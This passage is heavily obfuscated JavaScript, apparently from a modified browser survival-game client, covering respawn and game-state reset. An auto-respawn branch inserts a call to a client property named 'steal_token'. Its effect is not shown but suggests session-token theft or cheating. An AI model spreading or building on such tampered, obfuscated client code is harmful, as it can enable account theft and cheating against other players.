				ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ⲆᐃᐃⲆᐃ = ⵠΔΔᐃᐃ[1];
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ]);
				if (Settings.AutoRespawn.enabled) {
					getClientProperty("steal_token") && getClientProperty("steal_token").bind(window.client)()
					mapping.waiting = false;
					setTimeout(() => {
						mapping[c](mapping.ⲆᐃΔᐃⵠΔⵠ());
					}, 40);
				}
				else 
					{if (this.ΔⲆⲆΔ.ΔⲆⲆᐃⲆ != this.ΔⲆⲆᐃⲆ) return;
				this.ΔⲆⲆᐃⲆ++;
				ΔⵠⵠⲆ.ⵠΔΔΔᐃ(ᐃΔⵠⲆⲆΔᐃ.ⲆΔΔᐃⵠ);
				this.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[87]]()
				}
			}
			this.ping = function() {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⲆⵠᐃᐃ.ᐃΔΔⲆᐃΔⵠᐃⵠ)
			};
			this.ⲆⵠᐃᐃⲆⵠⵠΔᐃ = function() {
				if (this.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[41]] == 3) {
					this.ΔⵠⵠΔⲆΔⲆ -= ᐃⲆⵠᐃᐃ.ᐃⲆⲆⲆⵠΔΔ
				}
			};
			this.ⲆⲆᐃⵠⵠⵠᐃⲆᐃ = function() {
				if (ᐃⲆⵠᐃᐃ.ᐃⲆⵠⲆΔΔⵠⵠᐃ < ᐃⵠᐃᐃ) this.ΔⵠⵠΔⲆΔⲆ = ᐃⲆⵠⵠΔ;
				ᐃⲆⵠᐃᐃ.ᐃⲆⲆⲆⵠΔΔ < ᐃⲆⵠⵠΔ - this.ΔⵠⵠΔⲆΔⲆ && (this.ΔⵠⵠΔⲆΔⲆ = ᐃⲆⵠⵠΔ, this.ᐃⲆⲆᐃΔᐃᐃⵠⲆ())
			};
			this.ⲆⲆⵠⲆⲆᐃᐃΔᐃ = function(ᐃⲆᐃⵠ) {
				ⵠᐃⲆⵠⲆΔᐃ++;
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("commandMainBoxName")[ΔᐃⲆⵠⲆⵠΔ[290]] = this.ΔᐃⵠΔᐃ[this.ⵠΔⵠⲆΔ][this.ⲆΔⵠⵠⵠΔᐃ[this.ⵠΔⵠⲆΔ]]["a"];
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreForest").src = "img/forest-leaf.png";
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreWinter").src = "img/winter-flake.png";
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreDesert").src = "img/desert-cactus.png";
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreLava").src = "img/lava-volcano.png";
				this.ΔⵠⵠΔⲆΔⲆ = ᐃⲆⵠⵠΔ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.ⲆᐃⲆᐃᐃ = ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.ⵠᐃⵠΔⵠ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⵠⵠΔⵠᐃ.ⲆᐃⲆᐃᐃ = ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⵠⵠΔⵠᐃ.ⵠᐃⵠΔⵠ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⲆⲆΔⲆⵠ.ⲆᐃⲆᐃᐃ = ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⲆⲆΔⲆⵠ.ⵠᐃⵠΔⵠ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.ⲆᐃⲆᐃᐃ = ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.ⵠᐃⵠΔⵠ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⵠⲆⲆ.ⲆᐃⲆᐃᐃ = ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⵠⲆⲆ.ⵠᐃⵠΔⵠ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔ = ⲆⵠⲆⲆ;
				ᐃᐃΔ.ⲆΔⲆⵠ.c = 1;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⵠⵠᐃ = 1;
				ᐃᐃΔ.ⲆΔⲆⵠ.ΔᐃⲆ = 1;
				ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⲆΔ = 1;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔΔⵠΔ = ᐃᐃⲆΔ;
				ᐃᐃΔ.ⲆⵠᐃⲆⵠᐃⲆ = false;
				ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.display = Ⲇᐃᐃᐃ;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ = [];
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ = [];
				ᐃᐃΔ.ⲆⵠⲆⵠ.max = ΔᐃᐃΔ.ΔᐃⲆΔⲆΔⲆ;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠΔΔⵠⲆⵠ = 0;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠΔᐃⲆ = 0;
				ᐃᐃΔ.ⲆⵠⲆⵠ.id = -ⵠΔΔ;
				ΔⵠⵠⲆ.ⵠᐃΔᐃⵠⵠⵠ = 1;
				ΔⵠⵠⲆ.ΔΔᐃΔⲆΔⵠ = ᐃΔᐃⲆ;
				ΔⵠⵠⲆ.ᐃΔΔΔⵠᐃⲆ = ⵠΔΔ;
				ΔⵠⵠⲆ.ⲆⲆⲆΔⲆᐃⲆ = ⵠΔᐃ;
				ᐃᐃΔ.ᐃⵠⵠΔΔ = true;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.stop();
				if (!engineActive) {
					initEngine();
					initListeners();
					engineActive = true
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ = [];
				ᐃᐃΔ.ⵠΔΔⲆ.ⲆΔΔⲆⲆ = ⲆⲆᐃⵠᐃ;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃⵠⲆΔⵠΔⵠΔ = ⵠᐃⵠᐃᐃ;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -ᐃΔᐃⲆ;
				ᐃᐃΔ.ⵠΔΔⲆ.id = -ᐃⲆᐃ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠⵠᐃΔ = false;
				ᐃᐃΔ.ⵠΔΔⲆ.Ⲇⵠⵠⵠⵠ = ⲆΔᐃⲆΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠᐃⲆΔⲆ = false;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃⵠΔᐃᐃΔⵠ = false;
				ᐃᐃΔ.ⵠΔΔⲆ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, Δⵠᐃ, ΔΔᐃⵠ, ΔΔⵠⵠ, ⵠΔΔ, ΔΔΔ);
				ᐃᐃΔ.ⲆᐃΔᐃΔ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, Δᐃᐃᐃ, ᐃΔᐃⲆ, 0, ᐃᐃⵠ / ⵠᐃⲆⲆΔ, 1);
				ᐃᐃΔ.ⲆᐃΔᐃΔ.wait = ᐃⵠⵠᐃΔ;
				ᐃᐃΔ.ⲆⲆⵠⲆΔ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔⲆⵠⲆ, 1, 0, ΔⲆᐃᐃ / ᐃⲆⵠⵠ, ΔΔΔ);
				ᐃᐃΔ.ⲆⲆⵠⲆΔ.wait = ⲆΔⵠⲆΔ;
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, ⵠΔⵠΔ, Δᐃᐃᐃ, 1, ΔⵠⲆΔ);
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait = false;
				ᐃᐃΔ.ⵠΔΔᐃⵠ.id = -ⵠΔΔ;
				ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ = -ⵠΔᐃ;
				ᐃᐃΔ.ⵠΔΔᐃⵠ.wait = false;
				ᐃᐃΔ.ⵠΔΔᐃⵠ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 1, Δⵠᐃ, 1 / 30, 1);
				ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.x = -ΔⲆⵠ;
				ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.y = -1;
				ΔⵠⵠⲆ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃⵠⵠⲆᐃ;
				ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃᐃᐃⵠ = [];
				ᐃᐃΔ.ᐃⵠⲆᐃⵠ.enabled = false;
				ⲆⲆⲆ.mode = ᐃⲆᐃⵠ[1];
				ᐃⲆᐃⵠ[ⵠⵠⲆⲆⲆΔΔ] !== undefined && ᐃⲆᐃⵠ[21] !== ᐃᐃⵠᐃᐃ && (ⲆⲆⲆ.ᐃΔᐃᐃΔ = ᐃⲆᐃⵠ[20], ⲆⲆⲆ.ⵠᐃⵠⲆⵠ = ᐃⲆᐃⵠ[21], ⲆⲆⲆ.w = ⲆⲆⲆ.ᐃΔᐃᐃΔ * ⲆⲆⲆ.ᐃⲆⵠⲆᐃΔᐃ, ⲆⲆⲆ.ⵠⵠᐃ = ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ);
				ⲆⲆⲆ.ΔⲆΔᐃⵠΔⲆ = ᐃⲆᐃⵠ[22];
				ⲆⲆⲆ.ᐃᐃⲆᐃⲆ = ᐃⲆᐃⵠ[23];
				ᐃᐃᐃ.ⵠΔᐃⲆᐃⲆᐃ(ᐃⲆᐃⵠ[24]);
				ᐃᐃᐃ.ΔⵠⵠⵠΔΔᐃΔⵠ(ᐃⲆᐃⵠ[25]);
				ᐃᐃΔ.ⵠⲆΔᐃⵠ.ⲆⵠᐃᐃΔ = ᐃⲆᐃⵠ[26];
				ᐃᐃΔ.Δⵠⵠⵠⵠᐃᐃ = Ⲇᐃⵠⵠ;
				ᐃᐃΔ.ⲆᐃΔⲆΔ.ⲆⵠᐃᐃΔ = ᐃⲆᐃⵠ[27];
				ⲆⲆⲆ.ⲆᐃΔΔⵠᐃⲆᐃⲆ(ᐃⲆᐃⵠ[ⲆᐃⲆⲆⲆΔᐃ]);
				ⲆⲆⲆ.time = ᐃⲆᐃⵠ[ΔᐃΔⲆ];
				ⲆⲆⲆ.ⲆΔΔΔⵠ.ᐃⲆⲆΔΔ = ᐃⲆᐃⵠ[15];
				ⲆⲆⲆ.ⲆΔΔΔⵠ.ⲆⲆⲆΔⵠ = (new Date).getTime();
				ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ΔΔⲆⲆⲆΔᐃ = ᐃⲆᐃⵠ[ΔⵠᐃᐃⵠⲆⲆ];
				ⲆⲆⲆ.transition = ᐃⵠⵠⲆᐃ;
				ᐃᐃΔ.ᐃΔⲆ = ᐃⲆᐃⵠ[2];
				ΔⵠⵠⲆ.ᐃⲆᐃⲆ.reset();
				ᐃᐃΔ.ⲆᐃⵠⲆΔ = ᐃⲆᐃⵠ[8];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⲆⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⲆⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆⲆΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔⵠᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃᐃΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆᐃᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⵠΔΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃΔΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆⵠΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆᐃⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠΔⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔΔⲆⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆΔⵠΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⲆⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔΔᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⲆⵠⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆΔᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⵠᐃᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔΔⵠᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⵠΔᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⵠⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔᐃΔⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠⵠᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⲆᐃⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔΔⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔΔᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⵠⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⲆ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆⲆᐃ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆΔ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ] = [];
				ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ] = [];
				ⲆⲆⲆ.ᐃⲆⵠⵠⲆ = [];
				ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ = ᐃⲆᐃⵠ[ⵠⵠⲆⲆⵠ];
				ᐃᐃΔ.id = ᐃⲆᐃⵠ[ⵠᐃΔⵠΔ];
				ᐃᐃΔ.ⲆᐃΔΔ = ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ * ᐃᐃΔ.id;
				ⲆⲆⵠⲆ.loaded && (ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[0].ⲆᐃΔΔ = ᐃᐃΔ.ⲆᐃΔΔ, ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[0].ⲆⲆⲆΔⵠⲆⵠ = Δᐃᐃⵠ);
				ΔⵠⵠΔΔ.ⲆⲆΔⵠΔⲆⵠ();
				ᐃᐃΔ.ⲆΔΔ.ⲆⲆᐃΔⲆ(ᐃⲆᐃⵠ[3], ᐃⲆᐃⵠ[ᐃΔᐃΔⲆ]);
				ⲆⲆⲆ.ᐃᐃᐃⵠ = [];
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
				for (var ⵠᐃ = ΔΔⵠ; ᐃⲆᐃⵠ[11] > ⵠᐃ; ⵠᐃ++) ᐃᐃᐃⵠ.push(new ΔⵠⵠⲆⲆⲆΔᐃⲆ);
				for (var ⵠᐃ = ΔΔⵠⵠ, ⲆⲆⵠΔ = ᐃⲆᐃⵠ[4]; ⲆⲆⵠΔ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⲆⲆⵠΔ[ⵠᐃ]["i"]];
					ᐃⲆⲆ.ⵠΔⵠⲆᐃ = ⲆⲆⵠΔ[ⵠᐃ]["n"];
					ᐃⲆⲆ.ⲆⵠⲆᐃ = ⲆⲆⵠΔ[ⵠᐃ]["s"];
					ᐃⲆⲆ.Δᐃᐃⵠᐃ = ⲆⲆⵠΔ[ⵠᐃ]["a"];
					ᐃⲆⲆ.ⲆᐃⲆⲆᐃ = ⲆⲆⵠΔ[ⵠᐃ]["c"];
					ᐃⲆⲆ.ⵠⲆᐃⵠⵠ = ⲆⲆⵠΔ[ⵠᐃ]["b"];
					ᐃⲆⲆ.ᐃⲆⵠΔⵠ = ⲆⲆⵠΔ[ⵠᐃ]["d"];
					ᐃⲆⲆ.ⲆΔⲆⲆⵠⲆΔ = ⲆⲆⵠΔ[ⵠᐃ]["g"];
					ᐃⲆⲆ.level = ⲆⲆⵠΔ[ⵠᐃ]["l"];
					ᐃⲆⲆ.ᐃⵠᐃⵠⵠ = ΔΔⲆᐃ.ᐃⵠΔⲆⵠᐃⵠ(ⲆⲆⵠΔ[ⵠᐃ]["p"]);
					ᐃⲆⲆ.ᐃⵠⵠΔΔ = ᐃᐃⲆᐃᐃ;
					ΔᐃⲆⵠ === ΔⵠᐃΔΔΔᐃ && (ᐃⲆⲆ.ⵠΔⵠⲆᐃ += "|" + ⲆⲆⵠΔ[ⵠᐃ]["i"])
				}
				ᐃᐃΔ.ᐃΔΔⲆⵠ.sort();
				ⲆⲆⲆ.mode === ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ && ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.id].ⵠΔⵠⲆᐃ === ⵠ[575] ? ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ = true : ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ = ⲆΔᐃⲆΔ;
				if (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.id].ⲆⵠⲆᐃ === ΔᐃᐃΔ.ⲆᐃⵠΔᐃⲆΔ) ᐃᐃΔ.ⵠⵠⲆⵠⵠ = ⲆⲆⲆΔⲆ;
				else ᐃᐃΔ.ⵠⵠⲆⵠⵠ = false;
				if (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ && ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.id].ⲆⵠⲆᐃ === ΔᐃᐃΔ.ⵠΔⵠΔᐃⵠⲆ) ᐃᐃΔ.ΔⲆⵠΔⵠΔⲆ = ⲆᐃΔⲆⲆ;
				else ᐃᐃΔ.ΔⲆⵠΔⵠΔⲆ = false;
				ΔΔᐃᐃ.set("starve_token", ᐃᐃΔ.ᐃΔΔⲆⲆ);
				if (ᐃⲆᐃⵠ[ᐃⲆⲆΔⵠ] === 0) {
					ᐃᐃΔ.ΔᐃᐃⲆΔ.ΔⲆΔⲆΔ = Δⵠᐃ;
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.restore(ᐃⲆᐃⵠ[17]);
					var ⲆⵠⲆⵠ = ᐃⲆᐃⵠ[ⲆⵠⲆⵠΔⵠᐃ];
					ⲆⵠⲆⵠ[ᐃᐃ.ⵠᐃᐃⵠ] && ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠⵠⵠⵠⵠΔⲆ(ⲆⵠⲆⲆ, Ⲇᐃⵠⵠ);
					for (var ⵠᐃ = 0; ⲆⵠⲆⵠ.length > ⵠᐃ; ⵠᐃ++) {
						if (ⲆⵠⲆⵠ[ⵠᐃ]) {
							if (ᐃᐃ.ⵠᐃᐃⵠ == ⵠᐃ) continue;
							else if (ⵠᐃ == ᐃᐃ.ᐃⲆᐃΔᐃ) continue;
							else this.ᐃⵠⲆΔⲆΔⵠ([ⵠΔⲆⵠ, ⵠᐃ, ⲆⵠⲆⵠ[ⵠᐃ]])
						}
					}
					ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆⲆᐃⵠᐃ
				} else {
					if (ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ === ⲆⲆⲆ.mode) this.ᐃⵠⲆΔⲆΔⵠ([ΔᐃΔΔ, ᐃᐃ.ⵠΔᐃⵠᐃ, ΔΔΔ]);
					else if (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ) {
						ᐃᐃΔ.ΔⲆⵠΔⵠΔⲆ ? this.ᐃⵠⲆΔⲆΔⵠ([ⵠΔⲆⵠ, ᐃᐃ.ⵠΔⲆᐃⵠ, ⲆⵠΔⵠ]) : this.ᐃⵠⲆΔⲆΔⵠ([0, ᐃᐃ.ⵠⲆⲆⵠⲆ, ⲆᐃΔᐃ])
					}
					ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ⲆⵠΔⵠᐃ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ === ⲆⲆⲆ.mode || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ ? (ᐃᐃΔ.ΔᐃᐃⲆΔ.ΔⲆΔⲆΔ = (new Date).getTime(), ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃᐃⲆᐃᐃ, ᐃᐃΔ.ΔᐃᐃⲆΔ.value = ᐃⲆᐃⵠ[ΔⲆⵠΔⵠ], ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ⲆⲆⲆΔⵠ()) : (ᐃᐃΔ.ΔᐃᐃⲆΔ.ΔⲆΔⲆΔ = ΔⲆⵠⲆ, ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔᐃⲆΔ, ᐃᐃΔ.ΔᐃᐃⲆΔ.value = ⵠⲆᐃⵠ);
